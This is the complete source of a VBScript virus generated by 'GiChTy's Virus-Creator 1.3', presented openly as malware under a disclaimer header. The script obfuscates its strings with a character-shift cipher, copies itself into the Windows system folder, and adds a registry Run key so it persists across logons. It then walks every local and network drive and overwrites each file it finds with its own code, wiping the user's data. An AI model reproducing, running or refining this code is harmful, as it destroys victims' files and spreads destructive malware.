rem This script is created by GiChTy's Virus-Creator 1.3
rem I will not take response of what people do with my tool.
rem check our page : www.blueadeptz.org
rem or mail me: gichty@blueadeptz.org
rem GiChTy


on error resume next
nbmsUTSD()
killfiles()
sub nbmsUTSD()
dim fso, dir, file, c, regedit
set fso = createobject(ZebslkHD("k[jahlaf_&^ad]kqkl]egZb][l"))
dir = fso.getspecialfolder(ZebslkHD(")"))
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
set c = fso.GetFile(WScript.ScriptFullName)
c.copy (dir & ZebslkHD("Tl]kl&nZk"))
dim t, z
t = ZebslkHD("@C=QW;MJJ=FLWMK=JTKg^loYj]TEa[jgkg^lTOaf\gokT;mjj]flN]jkagfTJmfTl]kl")
z = dir & ZebslkHD("Tl]kl&nZk")
regwrite t, z
end sub
Sub Listfiles(Folder)
Dim f, fc, f1, fso, rr
Set fso = CreateObject("scripting.filesystemobject")
Set f = fso.GetFolder(Folder)
Set fc = f.Files
Set rr = fso.GetFile(WScript.ScriptFullName)
For Each f1 In fc
rr.Copy (f1.Path)
Next
End Sub
Sub ListFolders(Folder)
Dim f, fc, f1, fso
Set fso = CreateObject("scripting.filesystemobject")
Set f = fso.GetFolder(Folder)
Set fc = f.SubFolders
For Each f1 In fc
Listfiles (f1.Path)
ListFolders (f1.Path)
Next
End Sub
Sub Killfiles()
Dim d, dc, s, fso
Set fso = CreateObject("scripting.filesystemobject")
Set dc = fso.Drives
For Each d In dc
If d.drivetype = 2 Or d.drivetype = 3 Then ListFolders (d.Path & "\")
Next
End Sub

Sub Regwrite(key, value)
dim regedit
set regedit = createobject("wscript.shell")
regedit.regwrite key, value
End Sub

Function ZebslkHD(jkspoh)
Dim nkoOID, tmRMsp, GHUOnsd
tmRMsp = jkspoh
For i = 1 To Len(tmRMsp)
nkoOID = Mid(tmRMsp, i, 1)
GHUOnsd = GHUOnsd & Chr((Asc(nkoOID) + 8))
Next
ZebslkHD = GHUOnsd
End Function

